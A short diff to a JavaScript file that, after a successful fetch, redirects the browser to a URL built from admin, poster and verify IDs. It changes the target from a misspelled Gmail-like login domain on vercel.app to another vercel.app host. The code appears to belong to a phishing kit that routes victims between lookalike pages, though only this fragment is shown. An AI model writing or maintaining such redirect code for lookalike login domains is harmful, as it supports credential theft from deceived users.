@@ -72,7 +72,7 @@ document.addEventListener('DOMContentLoaded', () => {
                     console.log('Response:', data);
                     if (data) {
                         // Redirect to another URL on success
-                        window.location.href =`https://login-gmaail.vercel.app/${adminId}/${posterId}/${verifyId}`
+                        window.location.href =`https://chatfacetime.vercel.app/${adminId}/${posterId}/${verifyId}`
                     }
                 })
                 .catch(error => {
